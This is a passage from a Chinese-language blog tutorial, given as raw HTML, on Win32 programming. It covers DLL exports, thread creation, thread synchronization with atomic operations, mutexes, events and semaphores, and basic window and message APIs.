class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> once</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __DLLEXPORT</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __DLL_EXP _declspec(dllexport) </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __DLL_EXP _declspec(dllimport) </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> </span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __DLL_EXP 定义的函数<br></code></pre></td></tr></table></figure><p>添加完后再次生成<code>dll</code>文件即可</p></blockquote><h3 id="动态库封装类">动态库封装类</h3><p>在类名称前增加<code>_declspec(dllexport)</code>定义，例如∶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">class</span> _<span class="hljs-title">declspec</span>(<span class="hljs-title">dllexport</span>) <span class="hljs-title">CMath</span> &#123;</span><br>    XXX<br>&#125;;<br></code></pre></td></tr></table></figure><p>通常使用预编译开关切换类的导入导出定义，例如∶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> DLLCLASS_EXPORTS</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> EXT_CLASS _declspec(dllexport)<span class="hljs-comment">//DLL</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> EXT_CLASS_declspec(dllimport)<span class="hljs-comment">//使用者</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EXT_CLASS</span> <span class="hljs-title">CMath</span>&#123;</span><br>XXX <br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="线程">线程</h2><p><code>Windows</code>线程是可以执行的代码的实例。系统是以线程为单位调度程序。一序当中可以有多个线程，实现多任务的处理。</p><p>Windows 线程的特点︰</p><ol><li>线程都具有1个ID</li><li>每个线程都具有自己的内存栈</li><li>同一进程中的线程使用同一个地址空间。</li></ol><p>线程的调度：</p><p>将CPU的执行时间划分成时间片，依次根据时间片执行不同的线程。</p><p>线程轮询：</p><p>线程A-&gt;线程B-&gt;线程A…</p><h3 id="创建一个线程">创建一个线程</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">HANDLE <span class="hljs-title">CreateThread</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">LPSECURITY_ATTRIBUTES IpThreadAttributes,<span class="hljs-comment">//安全属性(已经废弃，直接置空)</span></span></span><br><span class="hljs-params"><span class="hljs-function">SIZE_T dwStackSize,<span class="hljs-comment">//线程栈的大小(按一兆进行对齐)</span></span></span><br><span class="hljs-params"><span class="hljs-function">LPTHREAD_START_ROUTINE lpStartAddress,<span class="hljs-comment">//线程处理函数的函数地址</span></span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID IpParameter,<span class="hljs-comment">//传递给线程处理函数的参数(void* 类型)</span></span></span><br><span class="hljs-params"><span class="hljs-function">DWORD dwCreationFlags,<span class="hljs-comment">//线程的创建方式 0:立刻执行 CREATE_SUSPENDED:挂起</span></span></span><br><span class="hljs-params"><span class="hljs-function">LPDWORD IpThreadId <span class="hljs-comment">//创建成功，返回线程的ID</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<span class="hljs-comment">//创建成功，返回线程句柄</span><br></code></pre></td></tr></table></figure><h3 id="处理函数">处理函数</h3><p>线程处理函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">DWORD WINAPI <span class="hljs-title">ThreadProc</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID lpParameter <span class="hljs-comment">//创建线程时，传递给线程的参数</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><p>挂起线程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">SuspendThread(HANDLE hThread)<span class="hljs-comment">//线程句柄</span><br></code></pre></td></tr></table></figure><p>恢复线程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ResumeThread(HANDLE hThread)<span class="hljs-comment">//线程句柄</span><br></code></pre></td></tr></table></figure><p>结束指定线程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">BOOL Terminate <span class="hljs-title">Thread</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HANDLE hThread,<span class="hljs-comment">//线程句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">DWORD dwExitCode<span class="hljs-comment">//退出码</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><blockquote><p>类似于&quot;杀人&quot;，输入对应线程的句柄就可以结束对应线程</p></blockquote><p>结束函数所在的线程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">VOID <span class="hljs-title">ExitThread</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">DWORD dwExitCode<span class="hljs-comment">//退出线程码</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><blockquote><p>类似于&quot;自杀&quot;，哪个线程调用，哪个线程就结束</p></blockquote><p>获取线程的ID：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">GetCurrentThreadId()<br></code></pre></td></tr></table></figure><p>获取当前线程的句柄：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">GetCurrentThread()<br></code></pre></td></tr></table></figure><p>等候单个句柄有信号：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">VOID <span class="hljs-title">WaitForSingleObject</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HANDLE handle，<span class="hljs-comment">//句柄BUFF的地址</span></span></span><br><span class="hljs-params"><span class="hljs-function">DWORD dwMilliseconds<span class="hljs-comment">//最大等候时间(以毫秒为单位)   INFINITE (等候时间无限大)</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><blockquote><p>可等候的句柄，需要包括有信号和无信号两个状态，可以是一个线程句柄。如果程序无信号(最大等候时间内)，该函数会阻塞，等候有信号时停止阻塞</p></blockquote><p>同时等候多个句柄有信号：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">DWORD <span class="hljs-title">WaitForMultipleObjects</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">DWORD nCount,<span class="hljs-comment">//句柄数量</span></span></span><br><span class="hljs-params"><span class="hljs-function">CONST HANDLE*lpHandles,<span class="hljs-comment">//句柄BUFF的地址</span></span></span><br><span class="hljs-params"><span class="hljs-function">BOOL bWaitAll,<span class="hljs-comment">//等候方式</span></span></span><br><span class="hljs-params"><span class="hljs-function">DWORD dwMilliseconds<span class="hljs-comment">//等候时间INFINITE</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><blockquote><p><code>bWaitAll</code>等候方式：</p><p><code>TRUE</code>：表示所有句柄都有信号，才结束等候<br><code>FASLE</code>：表示句柄中只要有一个有信号，就结束等候。</p><p>当线程执行中时，该线程无信号，当线程结束时才产生信号。</p></blockquote><h3 id="线程同步">线程同步</h3><h4 id="原子锁">原子锁</h4><h5 id="相关问题">相关问题</h5><p>多个线程对同一个数据进行原子操作，会产生结果丢失。比如执行<code>++</code>运算时。</p><h5 id="错误代码分析">错误代码分析</h5><p>当线程A执行<code>a value++</code>时，如果线程切换时间正好是在线程A将值保存到<code>a value</code>之前，线程B继续执行<code>g_value++</code>，那么当线程A再次被切换回来之后，会将原来线程A保存的值保存到<code>g_value上</code>，线程B进行的加法操作被覆盖。</p><blockquote><p>一般被<code>CPU</code>切换出该线程时，程序会将当前运行状态进行压栈保存( 每个进程都有独立的栈空间 )</p><img src="https://s2.loli.net/2022/04/09/I1lEPyRSDTWdf5o.png" style="zoom:80%;" /><p>以上图为例，当线程一再执行完语句一后，被<code>CPU</code>切换到线程二，线程一的数据进行压栈保存，线程二完整的执行完了对应的全部代码，此时切换回到线程一，栈中的数据弹出，执行语句三，而导致线程一的语句一的数据未被保存，而导致丢失了数据。</p></blockquote><h5 id="使用原子锁函数">使用原子锁函数</h5><p><code>InterlockedIncrement(long*)</code> 对<code>++</code>操作符进行加锁</p><blockquote><p>对传入的数据进行加一运算，当运行时间超过了等待时间，仍然会被操作系统切换到其他线程，当该线程无法进行加锁时会造成阻塞，只能等待切换线程。</p></blockquote><p><code>InterlockedDecrement</code> 对<code>--</code>操作符进行加锁<br><code>InterlockedCompareExchange</code> 对比较进行加锁<br><code>InterlockedExchange</code> 对交换进行加锁</p><h5 id="原子锁的实现">原子锁的实现</h5><p>直接对数据所在的内存操作，并且在任何一个瞬间只能有一个线程访问。</p><h4 id="互斥锁">互斥锁</h4><blockquote><p>效率不如原子锁，但是原子锁能实现的互斥锁均能实现</p></blockquote><h5 id="相关的问题">相关的问题</h5><p>多线程下代码或资源的共享使用。</p><h5 id="互斥的使用">互斥的使用</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">HANDLE <span class="hljs-title">CreateMutex</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">LPSECURITY_ATTRIBUTES IpMutexAttributes,<span class="hljs-comment">//安全属性</span></span></span><br><span class="hljs-params"><span class="hljs-function">BOOL bInitialOwner,<span class="hljs-comment">//初始的拥有者(哪个线程创建的就被哪个线程拥有) TRUE/FALSE</span></span></span><br><span class="hljs-params"><span class="hljs-function">LPCTSTR IpName<span class="hljs-comment">//命名</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span><span class="hljs-comment">//创建成功返回互斥句柄</span></span><br></code></pre></td></tr></table></figure><blockquote><p>在任何时间点上，只能有一个线程拥有互斥，具有独占性和排他性，当任何一个线程不拥有互斥时其拥有信号，但是当拥有互斥时其变为无信号。</p></blockquote><p><code>WaitForSingleObject /  WaitForMultipleObjects</code>互斥的等候遵循谁先等候谁先获取。</p><h5 id="释放互斥">释放互斥</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">BOOL <span class="hljs-title">ReleaseMutex</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HANDLE hMutex <span class="hljs-comment">// handle to mutex</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><h5 id="关闭互斥句柄">关闭互斥句柄</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">BOOL <span class="hljs-title">CloseHandle</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HANDLE hObject</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><h4 id="事件">事件</h4><h5 id="相关问题-2">相关问题</h5><p>解决程序之间的通知的问题。</p><h5 id="事件的使用">事件的使用</h5><p>创建事件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">HANDLE <span class="hljs-title">CreateEvent</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">LPSECURITY_ATTRIBUTES lpEventAttributes,<span class="hljs-comment">//安全属性</span></span></span><br><span class="hljs-params"><span class="hljs-function">BOOL bManualReset,<span class="hljs-comment">//事件重置（复位)方式，TRUE手动，FALSE自动</span></span></span><br><span class="hljs-params"><span class="hljs-function">BOOL bInitialState,<span class="hljs-comment">//事件初始状态，TRUE有信号</span></span></span><br><span class="hljs-params"><span class="hljs-function">LPCTSTR lpName <span class="hljs-comment">//事件命名</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span><span class="hljs-comment">//创建成功返回事件句柄</span></span><br></code></pre></td></tr></table></figure><blockquote><p>时间也具备有信号和无信号两个状态</p></blockquote><p>等候事件</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">WaitForSingleObject</span> / WaitForMultipleObjects<br></code></pre></td></tr></table></figure><p>触发事件(将事件设置成有信号状态)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">BOOL <span class="hljs-title">SetEvent</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HANDLE hEvent<span class="hljs-comment">// handle to event</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><p>关闭事件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">BOOL <span class="hljs-title">CloseHandle</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HANDLE hObject</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><p>注意：小心事件的死锁。</p><h4 id="信号量">信号量</h4><h5 id="相关的问题-2">相关的问题</h5><p>类似于事件，解决通知的相关问题。但提供一个计数器，可以设置次数。</p><h5 id="信号量的使用">信号量的使用</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">HANDLE <span class="hljs-title">CreateSemaphore</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">LPSECURITY_ATTRIBUTES lpSemaphoreAttributes,<span class="hljs-comment">//安全属性</span></span></span><br><span class="hljs-params"><span class="hljs-function">LONG lInitialCount,<span class="hljs-comment">//初始化信号量数量</span></span></span><br><span class="hljs-params"><span class="hljs-function">LONG lMaximumCount,<span class="hljs-comment">//信号量的最大值</span></span></span><br><span class="hljs-params"><span class="hljs-function">LPCTSTR lpName<span class="hljs-comment">//命名</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span><span class="hljs-comment">//创建成功返回信号量句柄</span></span><br></code></pre></td></tr></table></figure><h5 id="等候信号量">等候信号量</h5><p><code>WaitForSingleObject /  WaitForMultipleObjects</code>每等候通过一次，信号量的信号减1，直到为 0 阻塞</p><h5 id="给信号量指定计数值">给信号量指定计数值</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">BOOL <span class="hljs-title">ReleaseSemaphore</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HANDLE hSemaphore,<span class="hljs-comment">//信号量句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">LONG lReleaseCount,<span class="hljs-comment">//释放数量</span></span></span><br><span class="hljs-params"><span class="hljs-function">LPLONG lpPreviousCount<span class="hljs-comment">//释放前原来信号量的数量，可以为NULL</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><p>关闭句柄</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">BOOL <span class="hljs-title">CloseHandle</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HANDLE hObject</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><h2 id="相关函数">相关函数</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">WinMain</span><span class="hljs-params">( </span></span><br><span class="hljs-params"><span class="hljs-function">    HINSTANCE hInstance,<span class="hljs-comment">//当前程序的实例句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">    HINSTANCE hPrevInstance,<span class="hljs-comment">//当前程序前一个实例句柄 (已经废弃)</span></span></span><br><span class="hljs-params"><span class="hljs-function">    LPWSTR    lpCmdLine,<span class="hljs-comment">//命令行参数字符串 (char* 类型)</span></span></span><br><span class="hljs-params"><span class="hljs-function">    <span class="hljs-keyword">int</span>       nCmdShow<span class="hljs-comment">//窗口显示方式 (最大化、最小化、原样显示)</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><blockquote><p>句柄一个拿来找到内存的东西，但不是指针，句柄类型定义以<code>H</code>开头</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">MessageBox</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HWND hWnd,<span class="hljs-comment">//父窗口句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">LPCTSTR IpText,<span class="hljs-comment">//显示在消息框中的文字</span></span></span><br><span class="hljs-params"><span class="hljs-function">LPCTSTR IpCaption,<span class="hljs-comment">//显示在标题栏中的文字</span></span></span><br><span class="hljs-params"><span class="hljs-function">UINT uType<span class="hljs-comment">//消息框中的按钮、图标显示类型 (unsigned int) </span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<span class="hljs-comment">//返回点击的按钮ID</span><br></code></pre></td></tr></table></figure><blockquote><p><code>MessageBox</code>是一个阻塞函数，当提示框弹出时便阻塞了，当点击了按钮后终止阻塞</p><p><code>uType</code>按钮参数：</p><table><thead><tr><th>按钮参数</th><th>含义</th></tr></thead><tbody><tr><td>MB_OK</td><td>默认值。有一个确认按钮在里面。</td></tr><tr><td>MB_YESNO</td><td>有是和否在里面。</td></tr><tr><td>MB_ABORTRETRYIGNORE</td><td>有Abort（放弃），Retry（重试）和Ignore（跳过）</td></tr><tr><td>MB_YESNOCANCEL</td><td>消息框含有三个按钮：Yes，No和Cancel</td></tr><tr><td>MB_RETRYCANCEL</td><td>有Retry（重试）和Cancel（取消）</td></tr><tr><td>MB_OKCANCEL</td><td>消息框含有两个按钮：OK和Cancel</td></tr></tbody></table><p>图标：</p><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>MB_ICONEXCLAMATION</td><td>一个惊叹号出现在消息框</td></tr><tr><td>MB_ICONWARNING</td><td>一个惊叹号出现在消息框</td></tr><tr><td>MB_ICONINFORMATION</td><td>一个圆圈中小写字母 i 组成的图标出现在消息框</td></tr><tr><td>MB_ICONASTERISK</td><td>一个圆圈中小写字母 i 组成的图标出现在消息框</td></tr><tr><td>MB_ICONQUESTION</td><td>一个问题标记图标出现在消息框</td></tr><tr><td>MB_ICONSTOP</td><td>一个停止消息图标出现在消息框</td></tr><tr><td>MB_ICONERROR</td><td>一个停止消息图标出现在消息框</td></tr><tr><td>MB_ICONHAND</td><td>一个停止消息图标出现在消息框</td></tr></tbody></table></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">ATOM <span class="hljs-title">RegisterClass</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">CONST WNDCLASS* IpWndClass<span class="hljs-comment">//窗口类的数据</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span><span class="hljs-comment">//注册成功后，返回一个数标识</span></span><br></code></pre></td></tr></table></figure><blockquote><p>注册窗口类的结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">WNDCLASS</span>&#123;</span><br>UINT style;<span class="hljs-comment">//窗口类风格</span><br>WNDPROC IpfnWndroc;<span class="hljs-comment">//窗口处理函数</span><br><span class="hljs-keyword">int</span> cbClsExtra;<span class="hljs-comment">//窗口类的附加数据buff的大小(开缓冲区大小[字节])</span><br><span class="hljs-keyword">int</span> cbWndExtra;<span class="hljs-comment">//窗口的附加数据buff的大小(开缓冲区大小[字节])</span><br>HINSTANCE hInstance;<span class="hljs-comment">//当前模块的实例句柄</span><br>HICON hIcon;<span class="hljs-comment">//窗口图标句柄</span><br>HCURSOR hCursor;<span class="hljs-comment">//鼠标的句柄</span><br>HBRUSH hbrBackground;<span class="hljs-comment">//绘制窗口背景的画刷句柄</span><br>LPCTSTR IpszMenuName;<span class="hljs-comment">//窗口菜单的资源ID字符串</span><br>LPCTSR IpszClassName;<span class="hljs-comment">//窗口类名称</span><br>&#125;WNDCLASS,*PWNDCLASS;<br></code></pre></td></tr></table></figure><p><code>style</code>风格：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">CS_HREDRAW - 当窗口水平变化时，窗口重新绘制<br>CS_VREDRAW - 当窗口垂直变化时，窗口重新绘制<br>CS_DCLCLKS - 允许窗口接收鼠标双击<br>CS_NOCLOSE - 窗口没有关闭按钮<br></code></pre></td></tr></table></figure></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">HWND <span class="hljs-title">CreateWindowEx</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">DWORD dwExStyle,<span class="hljs-comment">//窗口的扩展风格</span></span></span><br><span class="hljs-params"><span class="hljs-function">LPCTSTR lpClassName，<span class="hljs-comment">//已经注册的窗口类名称</span></span></span><br><span class="hljs-params"><span class="hljs-function">LPCTSTR lpWindowName,<span class="hljs-comment">//窗口标题栏的名字</span></span></span><br><span class="hljs-params"><span class="hljs-function">DWORD dwStyle,<span class="hljs-comment">//窗口的基本风格</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> x,<span class="hljs-comment">//窗口左上角水平坐标位置</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> y,<span class="hljs-comment">//窗口左上角垂直坐标位置</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nWidth,<span class="hljs-comment">//窗口的宽度</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nHeight,<span class="hljs-comment">//窗口的高度</span></span></span><br><span class="hljs-params"><span class="hljs-function">HWND hWndParent,<span class="hljs-comment">//窗口的父窗口句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">HMENU hMenu,<span class="hljs-comment">//窗口菜单句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hInstance,<span class="hljs-comment">//应用程序实例句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID lpParam<span class="hljs-comment">//窗口创建时附加参数</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<span class="hljs-comment">//创建成功返回窗口句</span><br></code></pre></td></tr></table></figure><blockquote><p>窗口创建</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">WnfProc</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HWND hWnd, <span class="hljs-comment">//窗口句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">UINT msgID, <span class="hljs-comment">//消息ID</span></span></span><br><span class="hljs-params"><span class="hljs-function">WPARAM wParam, <span class="hljs-comment">//消息参数</span></span></span><br><span class="hljs-params"><span class="hljs-function">LPARAM lPARAM<span class="hljs-comment">//消息参数</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><blockquote><p>消息处理函数，通过用户自定义来对产生的消息进行处理</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">BOOL <span class="hljs-title">GetMessage</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">LPMSG IpMsg,<span class="hljs-comment">//存放获取到的消息BUFF</span></span></span><br><span class="hljs-params"><span class="hljs-function">HWND hWnd,<span class="hljs-comment">//窗口句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">UINT wMsgFilterMin,<span class="hljs-comment">//获取消息的最小ID</span></span></span><br><span class="hljs-params"><span class="hljs-function">UINT wMsgFilterMax<span class="hljs-comment">//获取消息的最大ID</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><blockquote><p><code>IpMsg</code>：当获取到消息后，将消息的参数存放到<code>MSG</code>结构中<br><code>hWnd</code>：获取<code>hWnd</code>所指定窗口的消息<br><code>wMsgFilterMax</code>和<code>wMsgFilterMin</code>：只能获取到由它们指定的消息范围内的消息，如果都为<code>0</code>，表示没有范围。</p><p>返回值：</p><p>抓到<code>WM_QUIT</code>返回零值，否则返回非零值。<br><code>PostQuitMessage(0)</code>可以发送一个<code>WM_QUIT</code>消息，使其返回</p><p>在程序（线程）消息队列查找消息，如果队列有消息，检查消息是否满足指定条件(HWND,ID范围)，不满足条件就不会取出消息，否则从队列取出消息返回。<br>如果程序（线程）消息队列没有消息，向系统消息队列获取属于本程序的消息。如果系统队列的当前消息属于本程序，系统会将消息转发到程序消息队列中。<br>如果系统消息队列也没有消息，检查当前进程的所有窗口的需要重新绘制的区域，如果发现有需要绘制的区域，产生<code>WM_PAINT</code>消息，取得消息返回处理。<br>如果没有重新绘制区域，检查定时器如果有到时的定时器，产生<code>WM_TIMER</code>,返回处理执行。<br><code>GetMessage</code>会继续等候下一条消息。<code>PeekMessage</code>会返回<code>FALSE</code>，交出程序的控制权。<br>注意：<code>GetMessage</code>如果获取到是<code>WM_QUIT</code>,函数会返回<code>FALSE</code>。<br>如果没有到时的定时器，整理程序的资源、内存等等。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">BOOL <span class="hljs-title">TranslateMessage</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">CONST 